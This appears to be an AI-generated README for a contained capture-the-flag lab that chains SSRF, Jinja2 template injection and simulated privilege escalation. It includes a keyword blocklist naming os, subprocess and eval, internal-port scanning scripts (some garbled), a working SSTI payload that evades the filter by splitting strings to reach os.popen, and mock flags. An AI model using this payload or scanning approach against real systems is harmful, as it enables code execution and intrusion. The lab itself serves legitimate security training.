<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# full readme.md file

```markdown
# Boot2Root — Safe SSRF → SSTI → RCE → LPE Simulation

![CTF Diagram](https://i.imgur.com/lvCdfxR.png)  
*High-level architecture of the Boot2Root challenge.*

---

## Overview

This is a **safe, contained Boot2Root simulation** teaching chained exploitation techniques:

**SSRF → SSTI → simulated RCE → LPE**

- **Safe:** No real remote code execution.
- **Educational:** Focused on enumeration, template injection, and privilege escalation simulation.
- **Contained:** Vulnerable services run locally.

---

## Services

| Service    | URL / Port        | Description                                                    |
|------------|-------------------|----------------------------------------------------------------|
| public-app | `http://localhost` | Image gallery using `/fetch?url=...`. Proxy internal requests. |
| admin-api  | `http://localhost:9000` | Admin endpoints: `/admin`, `/status`, `/render`, `/render/json`. |

> Players must use the gallery `/fetch` proxy — direct access to `:9000` is blocked.

---

## Goals

1. Discover SSRF on gallery `/fetch?url=<internal-url>`
2. Find admin routes: `/admin`, `/status`, `/render`, `/render/json`
3. Exploit **safe SSTI** at `/render/json` (Jinja2), avoiding forbidden keywords:

```

FORBIDDEN_KEYWORDS = [
"config", "request", "self", "cycler", "__class__",
"os", "subprocess", "__subclasses__", "eval", "exec",
"import", "builtins"
]

```

4. Simulate **Privilege Escalation**: `monkey` → `shelldon` → read final flag.

**Flags:**

- Low-priv: `SADC{mock_friendly_flag_monkey_readable}`
- Final: `SADC{long_mocking_friendly_flag_here}`

---

## Enumeration Route

Use:

```

http://localhost/fetch?url=http%3A%2F%2Flocalhost%3A9000%2Frender

```

All internal probes are done **through this SSRF proxy**.

---

## Simplified Enumeration Script (Bash)

```

\#!/bin/bash

# simple_scan.sh - probes internal ports and paths via /fetch proxy

HOST="localhost"
PROXY="http://localhost/fetch?url="
PORTS=(9000 8080)
PATHS=("/" "/admin" "/status" "/render" "/render/json")

for PORT in "${PORTS[@]}"; do
  for PATH in "${PATHS[@]}"; do
TARGET="http://${HOST}:${PORT}${PATH}"
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TARGET', safe=''))")
    URL="${PROXY}${ENCODED}"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "\$URL")
echo "Proxied \$TARGET => HTTP \$STATUS"
done
done

```
> Save as `simple_scan.sh` and run with:  
> `chmod +x simple_scan.sh && ./simple_scan.sh`

---

## Simplified Enumeration Script (Python)

```

\#!/usr/bin/env python3
import urllib.parse
import requests

HOST = "localhost"
PORTS =
PATHS = ["/", "/admin", "/status", "/render", "/render/json"]
PROXY = "http://localhost/fetch?url="

for port in PORTS:
for path in PATHS:
target = f"http://{HOST}:{port}{path}"
encoded = urllib.parse.quote(target, safe="")
url = PROXY + encoded
try:
r = requests.get(url, timeout=5)
print(f"Proxied {target} => HTTP {r.status_code}")
except requests.RequestException as e:
print(f"Proxied {target} => ERROR {e}")

```
> Run with: `python3 simple_scan.py`

---

## Real Template Payload Example for SSTI Testing on `/render/json`

```

{{ joiner.__init__.__globals__['__buil'+'tins__']['__im' + 'port__']('o' + 's').popen('echo SADC{rce_test}').read() }}

```

This payload:

- Bypasses basic filters by splitting keywords.
- Executes `echo SADC{rce_test}` to simulate RCE output.
- Can be sent via `/render/json` to verify SSTI exploit viability.

---

This documentation provides a concise guide with clear enumeration scripts and payload example to facilitate players through the Boot2Root CTF challenge from discovery to exploitation.
```
